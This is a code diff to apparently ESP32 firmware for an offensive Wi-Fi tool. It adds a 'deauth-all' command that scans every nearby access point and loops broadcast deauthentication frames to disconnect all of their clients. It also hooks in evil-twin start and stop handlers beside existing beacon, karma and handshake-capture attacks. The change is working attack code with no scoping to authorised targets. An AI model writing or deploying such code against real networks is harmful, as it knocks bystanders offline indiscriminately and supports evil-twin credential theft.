@@ -11,6 +11,7 @@
 #include "m1_rpc.h"
 #include "m1_rpc_proto.h"
 #include "m1_rpc_offensive.h"
+#include "m1_rpc_eviltwin.h"
 
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
@@ -28,6 +29,9 @@ static uint8_t s_monitor_channel = 1;
 static TaskHandle_t s_deauth_task = NULL;
 static volatile bool s_deauth_stop = false;
 static volatile uint32_t s_deauth_sent_count = 0;
+
+static TaskHandle_t s_deauth_all_task = NULL;
+static volatile bool s_deauth_all_stop = false;
 
 static TaskHandle_t s_beacon_task = NULL;
 static volatile bool s_beacon_stop = false;
@@ -57,6 +61,7 @@ static void stop_task(TaskHandle_t *handle, volatile bool *stop_flag)
 static void stop_all_attacks(void)
 {
     stop_task(&s_deauth_task, &s_deauth_stop);
+    stop_task(&s_deauth_all_task, &s_deauth_all_stop);
     stop_task(&s_beacon_task, &s_beacon_stop);
     stop_task(&s_probe_task, &s_probe_stop);
     stop_task(&s_karma_task, &s_karma_stop);
@@ -284,6 +289,7 @@ static m1_status_t cmd_deauth_stop(const uint8_t *p, uint16_t len,
                                     uint8_t *resp, uint16_t *rl)
 {
     stop_task(&s_deauth_task, &s_deauth_stop);
+    stop_task(&s_deauth_all_task, &s_deauth_all_stop);
     return M1_OK;
 }
 
@@ -292,8 +298,88 @@ static m1_status_t cmd_deauth_status(const uint8_t *p, uint16_t len,
 {
     uint32_t c = s_deauth_sent_count;
     memcpy(resp, &c, 4);
-    resp[4] = (s_deauth_task != NULL) ? 1 : 0;
+    resp[4] = (s_deauth_task != NULL || s_deauth_all_task != NULL) ? 1 : 0;
     *rl = 5;
+    return M1_OK;
+}
+
+/* ── Deauth-all (broadcast sweep over discovered APs) ────────────── */
+
+#define DEAUTH_ALL_MAX 32
+
+static uint8_t s_da_bssid[DEAUTH_ALL_MAX][6];
+static uint8_t s_da_channel[DEAUTH_ALL_MAX];
+static int s_da_count = 0;
+
+static void deauth_all_task_func(void *arg)
+{
+    uint8_t frame[DEAUTH_FRAME_LEN];
+    const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    uint32_t sent = 0;
+
+    while (!s_deauth_all_stop) {
+        for (int i = 0; i < s_da_count && !s_deauth_all_stop; i++) {
+            esp_wifi_set_channel(s_da_channel[i], WIFI_SECOND_CHAN_NONE);
+            s_monitor_channel = s_da_channel[i];
+            /* Broadcast deauth: AP kicks every associated station. */
+            build_deauth_frame(frame, bcast, s_da_bssid[i], 7);
+            for (int r = 0; r < 3; r++) {
+                esp_wifi_80211_tx(WIFI_IF_STA, frame, DEAUTH_FRAME_LEN, false);
+            }
+            sent += 3;
+            s_deauth_sent_count = sent;
+            vTaskDelay(pdMS_TO_TICKS(20));
+        }
+        if (s_da_count == 0) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+        }
+    }
+    s_deauth_all_task = NULL;
+    vTaskDelete(NULL);
+}
+
+static m1_status_t cmd_deauth_all(const uint8_t *p, uint16_t len,
+                                   uint8_t *resp, uint16_t *rl)
+{
+    static wifi_ap_record_t recs[DEAUTH_ALL_MAX];
+    uint16_t num = DEAUTH_ALL_MAX;
+
+    if (s_deauth_all_task) return M1_ERR_ALREADY_RUNNING;
+
+    /* Drop monitor mode so we can run a managed-mode scan to find targets. */
+    exit_monitor();
+
+    if (esp_wifi_scan_start(NULL, true) != ESP_OK) {
+        return M1_ERR_HARDWARE;
+    }
+    if (esp_wifi_scan_get_ap_records(&num, recs) != ESP_OK) {
+        return M1_ERR_HARDWARE;
+    }
+
+    s_da_count = (num > DEAUTH_ALL_MAX) ? DEAUTH_ALL_MAX : (int)num;
+    for (int i = 0; i < s_da_count; i++) {
+        memcpy(s_da_bssid[i], recs[i].bssid, 6);
+        s_da_channel[i] = recs[i].primary;
+    }
+    if (s_da_count == 0) {
+        return M1_ERR_NOT_RUNNING; /* nothing to attack */
+    }
+
+    if (!enter_monitor(s_da_channel[0])) {
+        return M1_ERR_HARDWARE;
+    }
+
+    s_deauth_sent_count = 0;
+    s_deauth_all_stop = false;
+    if (xTaskCreate(deauth_all_task_func, "m1deauthall", 4096, NULL, 5,
+                    &s_deauth_all_task) != pdPASS) {
+        s_deauth_all_task = NULL;
+        return M1_ERR_NO_MEM;
+    }
+
+    /* Report how many APs are being swept. */
+    resp[0] = (uint8_t)s_da_count;
+    *rl = 1;
     return M1_OK;
 }
 
@@ -696,6 +782,9 @@ m1_status_t m1_rpc_off_wifi_handler(uint16_t msg_id,
     case M1_MSG_OFF_KARMA_STOP:     return cmd_karma_stop(payload, payload_len, resp_buf, resp_len);
     case M1_MSG_OFF_HSCAPTURE:      return cmd_hscap_start(payload, payload_len, resp_buf, resp_len);
     case M1_MSG_OFF_RAW_TX:        return cmd_raw_tx(payload, payload_len, resp_buf, resp_len);
+    case M1_MSG_OFF_DEAUTH_ALL:    return cmd_deauth_all(payload, payload_len, resp_buf, resp_len);
+    case M1_MSG_OFF_EVILTWIN_START: *resp_len = 0; return m1_eviltwin_start(payload, payload_len);
+    case M1_MSG_OFF_EVILTWIN_STOP:  *resp_len = 0; return m1_eviltwin_stop();
     default:                        return M1_ERR_UNSUPPORTED;
     }
 }
